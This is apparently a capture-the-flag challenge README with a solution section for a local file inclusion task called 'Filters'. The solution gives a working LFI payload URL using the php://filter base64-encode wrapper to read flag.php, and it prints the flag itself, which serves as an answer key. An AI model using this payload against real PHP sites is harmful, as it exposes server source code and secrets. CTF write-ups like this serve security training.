# Filters

## Description

I think getting the flag for Included was too easy, so this time, I moved the flag to `flag.php`.

Tip: The flag is in flag.php

## Dev Notes

`index.php` is provided

Start: `make start`<br>
Stop: `make stop`<br>

## Solution
requires LFI. google finds [this](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html). Go to the section that says Bypassing php-execution and read.
This link gets base64 encoded flag:
```
http://localhost/?file=php://filter/convert.base64-encode/resource=flag.php
```

base64 decode to get flag

flag: `gigem{l3ss_s1mpl3_lfi_vuln_0xd34db33f}`
